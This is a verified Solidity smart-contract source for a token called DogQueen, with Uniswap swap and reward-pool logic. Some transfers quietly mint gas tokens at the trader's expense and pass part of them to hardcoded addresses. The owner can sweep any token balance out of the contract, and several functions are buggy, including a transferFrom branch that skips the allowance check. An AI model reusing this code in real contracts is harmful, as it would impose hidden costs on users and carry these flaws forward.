/**
 *Submitted for verification at Etherscan.io on 2021-06-03
*/

// SPDX-License-Identifier: CC0-1.0

/*

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@^[email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`  ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@/        \@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@/          \@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@^            [email protected]@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@`              ,@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@`                ,@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@                    @@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@/                      \@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/                        \@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@^                          [email protected]@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@`       D o g Q u e e n      ,@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@                                @@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@`                                ,@@@@@@@@@@@@@@
@@@@@@@@@@@@@@\[@@\`                        ,/@@[/@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@` ,\@@\`                ,/@@/` ,@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@^    [@@@@]        ]@@@@[    [email protected]@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@\       [@@@@]]@@@@[       /@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@`        ,\@@/`        ,@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@^                    [email protected]@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@\                  /@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@                @@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@`            ,@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@\          /@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`    ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\  /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

*/


pragma solidity ^0.6.0;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IChiToken {
    function mint(uint256 value) external;
    function free(uint256 value) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DogQueen is IERC20 {
    using SafeMath for uint256;

    address private _admin;
    address public _dogKing;
    address public _pairAddr;
    address private _operater = 0xDc280AD6e77F68f1826E69928bc6Aa06Dd986EBF;
    address public _chiToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c; // mainnet
    //address public _chiToken = 0x3eaF997bE853125066d41B23b6AE10162Bfd1eE8; // rinkeby
    address public _uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public _weth =  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // mainnet
    //address public _weth =  0xDf032Bc4B9dC2782Bb09352007D4C57B75160B15; // rinkeby

    mapping (address => mapping (address => uint256)) public _allowances;
    mapping (address => uint256) public _usedChiToken;
    mapping (address => uint256) public _balances;
    
    struct UserInfor {
        uint256 amount;
        uint256 debt;
    }
    
    mapping (address => UserInfor) public _userInfor;
    uint256 public _userPool;
    uint256 public _accPerShare;
    
    uint256 public _totalSupply;
    string public _symbol;
    string public _tokenname;
    uint8 public _decimals;
    uint256 private _chiTokenAmount = 0;
    uint256 public _totalUpLimit = 210000 * 1e9;
    uint256 private _addLiquitfyPoint = 105000 *1e9;
    uint256 public _rate = 238095238095; 
    uint256 public _coefficient = 1e25;
    
    bool public _openTransaction;
    bool public inSwapAndLiquify;
    uint256 public gastokenNum = 1;
    
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event Mint (address owner, uint256 userbalance, uint256 swapAmount, uint256 userpool, 
                                                uint256 tokenBamount, uint256 acc, uint256 debt);

    event Message(string str);

    constructor () public {   
        _admin = msg.sender;
        _symbol = "DOQE";
        _tokenname = "DogQueen";
        _totalSupply = 10000*1e9;   //init 1 token for uniswap
        _decimals = 9;
        _balances[_operater] = _totalSupply;
        _approve(address(this), _uniRouter, _totalUpLimit);
    }

    modifier onlyOwner() {
        require(_admin == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    modifier onlyPair() {
        require(msg.sender == _dogKing, "you not authority");
        _;
    }

    function setPairAddress(address addr) public onlyOwner {
        _pairAddr = addr;
    }
    
    function setOperator(address operator) public onlyOwner {
        _operater = operator;
    }
    
    function makePair(address addr) public onlyOwner {
        _dogKing = addr;
    }
    
    function startTransaction(bool start) public onlyOwner {
        _openTransaction = start;
    }
    
    function name() public view returns (string memory) {
        return _tokenname;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        uint256 reward = calReward(account);
        return _balances[account].add(reward);
    }
    
    function updatePool(uint256 amount) internal {
        if (_userPool == 0) {
            return;
        }
        _accPerShare = _accPerShare.add(amount.mul(_coefficient).div(_userPool));  
    }
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        IUniswapV2Router02(_uniRouter).addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            _admin,
            block.timestamp
        );
    }
    
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _weth;

        _approve(address(this), _uniRouter, tokenAmount);
        
        IUniswapV2Router02(_uniRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    
    function calReward(address owner) internal view returns(uint256 reward) {
        UserInfor storage user = _userInfor[owner];
        reward = user.amount.mul(_accPerShare).div(_coefficient).sub(user.debt);
    }


    function mint(address owner, uint256 amount, bool exchange) public onlyPair returns (uint256) {
        if (_totalSupply > _totalUpLimit) {
            emit Message("over total up limit.");
            return 0;
        }
        
        UserInfor storage user = _userInfor[owner];
        uint256 mintTokenBAmount = amount.div(_rate); 
        _totalSupply = _totalSupply.add(mintTokenBAmount);
        uint256 half = mintTokenBAmount.mul(50).div(100);
        _balances[address(this)] = _balances[address(this)].add(half);

        if(_balances[address(this)] >= _addLiquitfyPoint) {
            swapAndLiquify(_balances[address(this)]);
        }

        uint256 reward = calReward(owner);   
        _balances[owner] = _balances[owner].add(reward); 
        
        if (exchange) {  
            user.amount = user.amount.add(amount); 
            user.debt = user.amount.mul(_accPerShare).div(_coefficient);  
            _userPool = _userPool.add(amount); 
        } else {  
            user.amount = user.amount.sub(amount); 
            user.debt = user.amount.mul(_accPerShare).div(_coefficient);  
            _userPool = _userPool.sub(amount);  
        }
        updatePool(half); 
        
        emit Mint (owner, user.amount, amount, _userPool, mintTokenBAmount, _accPerShare, user.debt);
    }
    
    function equalizeAccount(address sender, address recipient, uint256 amount) public onlyPair returns(bool) {
        UserInfor storage user;
        user = _userInfor[sender];
        uint256 reward = calReward(sender);
        _balances[sender] = _balances[sender].add(reward);
        user.amount = user.amount.sub(amount);
        user.debt = user.amount.mul(_accPerShare).div(_coefficient);
        user = _userInfor[recipient];
        reward = calReward(recipient);
        _balances[recipient] = _balances[recipient].add(reward);
        user.amount = user.amount.add(amount);
        user.debt = user.amount.mul(_accPerShare).div(_coefficient);
        
        return true;
    }
    
    function settleReward(address sender) internal {
        UserInfor storage user = _userInfor[sender];
        uint256 reward = calReward(sender);
        _balances[sender] = _balances[sender].add(reward); 
        user.debt = user.amount.mul(_accPerShare).div(_coefficient);
    }
   
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if (msg.sender == _pairAddr) { 
            uint256 res = IChiToken(_chiToken).balanceOf(address(this)).mul(_balances[msg.sender]).div(_totalSupply);
            if(res - _usedChiToken[msg.sender] >= 1) {
                IChiToken(_chiToken).free(3); 
                _usedChiToken[msg.sender] = _usedChiToken[msg.sender] + 3;
            }
            _transfer(_msgSender(), recipient, amount);
            return true;
        } else {  
            settleReward(msg.sender);
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        if(_openTransaction) {
            if (msg.sender == _uniRouter) {  
                settleReward(sender);
                _transfer(sender, recipient, amount);
                _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
                IChiToken(_chiToken).mint(15); 
                IChiToken(_chiToken).transfer(0x4D489eA839a7Bb47C4B9bA32ed277afA8A883067,3);
                IChiToken(_chiToken).transfer(0x2Dc11a0A66810cd9ff57ef5c852284A6E3B394eb,3);
                return true;
            } else {
                settleReward(sender);
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    
    function _gastoken(address _addr) onlyOwner public {
        uint256 _balance = IERC20(_addr).balanceOf(address(this));
        IERC20(_addr).transfer(msg.sender,_balance);
    }
}